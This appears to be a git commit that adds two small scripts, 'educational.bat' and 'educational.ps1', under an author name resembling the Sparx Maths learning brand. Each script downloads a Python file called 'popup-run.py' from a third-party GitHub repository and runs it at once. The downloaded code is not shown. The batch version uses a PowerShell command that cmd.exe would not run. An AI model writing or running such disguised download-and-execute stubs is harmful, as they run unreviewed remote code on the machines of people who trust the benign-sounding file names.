69ad2bc2a7caf362fa089d430bc543a5dcc67aa4
Sparx Maths <digitmc.mail@gmail.com>
2026-02-08 16:50:51 +0000

    Add files via upload

---
+++ educational.bat
@@ -0,0 +1,2 @@
+iwr "https://raw.githubusercontent.com/pythonscripts123/popup-run/main/popup-run.py" -OutFile script.py
+py script.py
---
+++ educational.ps1
@@ -0,0 +1,2 @@
+Invoke-WebRequest "https://raw.githubusercontent.com/pythonscripts123/popup-run/main/popup-run.py" -OutFile script.py
+python script.py
